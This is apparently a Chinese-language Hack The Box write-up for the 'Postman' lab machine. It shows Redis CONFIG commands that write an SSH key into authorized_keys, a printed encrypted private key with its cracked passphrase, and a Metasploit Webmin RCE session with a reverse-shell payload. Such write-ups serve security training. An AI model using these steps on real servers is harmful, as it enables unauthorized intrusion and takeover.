---
title: Postman(Redis未授权访问)
date: 2021-12-24 11:31:17
tags: Hack The Box
top: true
categories: 未授权访问漏洞
---

## 信息收集

发现目标开放了22、80、6379等常见端口

```bash
root💀kali)-[~/Desktop/Scan-Scripts]
└─# ./nmap.sh 10.10.10.160
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 07:32 EST
Nmap scan report for 10.10.10.160
Host is up (0.30s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.85 seconds
```

<!--more-->

我们访问一下web服务，发现只是一个普通的web页面而已![在这里插入图片描述](https://img-blog.csdnimg.cn/31925c3c4c634d4c8dfa4491466b77e0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们模糊一下网站路径

```bash
┌──(root💀kali)-[~/Desktop/Scan-Scripts]
└─# dirsearch -u "http://10.10.10.160" -e * -x404,403,500

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )                                                                                                                        
                                                                                                                                               
Extensions: nmap.sh | HTTP method: GET | Threads: 30 | Wordlist size: 8979

Output File: /root/.dirsearch/reports/10.10.10.160/_21-11-30_07-47-35.txt

Error Log: /root/.dirsearch/logs/errors-21-11-30_07-47-35.log

Target: http://10.10.10.160/
                                                                                                                                               
[07:47:35] Starting: 
[07:48:35] 301 -  310B  - /css  ->  http://10.10.10.160/css/                                                                             
[07:48:44] 301 -  312B  - /fonts  ->  http://10.10.10.160/fonts/                                                             
[07:48:48] 301 -  313B  - /images  ->  http://10.10.10.160/images/                        
[07:48:48] 200 -    2KB - /images/
[07:48:50] 200 -    4KB - /index.html                                                                                                 
[07:48:51] 200 -    3KB - /js/                                                                                                              
[07:48:52] 301 -  309B  - /js  ->  http://10.10.10.160/js/                   
[07:49:25] 301 -  313B  - /upload  ->  http://10.10.10.160/upload/                                                                       
[07:49:27] 200 -    8KB - /upload/                                                                          
                                                                                                                       
Task Completed
```

<!--more-->

我们发现一个upload目录，访问发现只有一些图片而已
![在这里插入图片描述](https://img-blog.csdnimg.cn/b3c145006edb4713a933104a79cae707.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
web攻击无果，那我们将注意力转移到redis数据库上，尝试是否存在未授权访问漏洞
![在这里插入图片描述](https://img-blog.csdnimg.cn/f8887a8690934a50aefef93ab24f104a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

## 漏洞利用

我们首先将我们的ssh-key写入到key.txt文件中
![在这里插入图片描述](https://img-blog.csdnimg.cn/30cc35f7466642ae8fc852db4f111dc6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
再把key.txt文件内容写入redis缓存中
![在这里插入图片描述](https://img-blog.csdnimg.cn/3f83ac49ad7546059774aba3c56a198e.png)

```bash
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis"
10.10.10.160:6379> config set /var/lib/redis/.ssh
(error) ERR Wrong number of arguments for CONFIG set
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> config set dbfilename authorized_keys
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379> exit
```

我们尝试登录到该主机上
![在这里插入图片描述](https://img-blog.csdnimg.cn/795ba910f639419d8987d79f0ec483b2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们上传linpeas.sh脚本到目标主机上发现，主机的/opt目录上存在一份私钥备份

```bash
redis@Postman:~$ cat /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

我们将其下载到本机，并使用ssh2john.py将其哈希导出
![在这里插入图片描述](https://img-blog.csdnimg.cn/66c4d071bea24d2bb4891441037f3a8d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后使用john进行破解得到密码，得到密码computer2008，登录到Matt账户
![在这里插入图片描述](https://img-blog.csdnimg.cn/40e53a09c8a549a19313e7fb22d13443.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

## 提权root

我们访问10000端口发现是个webmin应用程序，在EDB发现存在RCE漏洞并在MSF中集成
![在这里插入图片描述](https://img-blog.csdnimg.cn/83ea6c04c24c457e896f109ef6a6cfbf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/ae16ec96fd1d44ceac7112af658419af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们直接使用第二个并填写好参数后，得到root权限

```bash
msf6 > use 2
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(linux/http/webmin_packageup_rce) > show options 

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME                    yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin <= 1.910


msf6 exploit(linux/http/webmin_packageup_rce) > set password computer2008
password => computer2008
msf6 exploit(linux/http/webmin_packageup_rce) > set rhosts 10.10.10.160
rhosts => 10.10.10.160
msf6 exploit(linux/http/webmin_packageup_rce) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!
ssl => true
msf6 exploit(linux/http/webmin_packageup_rce) > show options 

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   computer2008     yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.160     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      10000            yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME                    yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin <= 1.910


msf6 exploit(linux/http/webmin_packageup_rce) > set username Matt
username => Matt
msf6 exploit(linux/http/webmin_packageup_rce) > set lhost 10.10.14.9
lhost => 10.10.14.9
msf6 exploit(linux/http/webmin_packageup_rce) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!
ssl => true
msf6 exploit(linux/http/webmin_packageup_rce) > exploit
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/6427bab560c04677b571daeed8ba6947.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
